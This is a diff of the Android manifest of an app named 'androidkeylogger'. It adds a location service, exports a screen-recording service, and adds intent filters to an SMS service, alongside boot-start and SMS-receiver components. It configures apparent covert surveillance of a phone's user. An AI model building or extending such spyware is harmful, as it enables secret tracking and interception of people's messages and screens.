@@ -2,6 +2,8 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools"
     package="com.azamovhudstc.androidkeylogger">
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
 
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
@@ -43,6 +45,9 @@
         android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
         android:theme="@style/Theme.AndroidKeyLogger">
+
+        <service android:name=".service.LocationService" />
+
         <receiver android:name=".receiver.BootReceiver"
             android:exported="true">
             <intent-filter>
@@ -52,8 +57,17 @@
         <service
             android:name=".service.ScreenRecordService"
             android:enabled="true"
-            android:exported="false" />
-        <service android:name=".service.SmsService" android:exported="true" />
+            android:exported="true">
+            <intent-filter>
+                <action android:name="com.example.action.STOP_RECORDING" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </service>
+        <service android:name=".service.SmsService" android:exported="true" >
+            <intent-filter>
+                <action android:name="com.azamovhudstc.SMS_ACTION" />
+            </intent-filter>
+        </service>
 
         <receiver android:name=".receiver.SmsReceiver"
             android:exported="true"
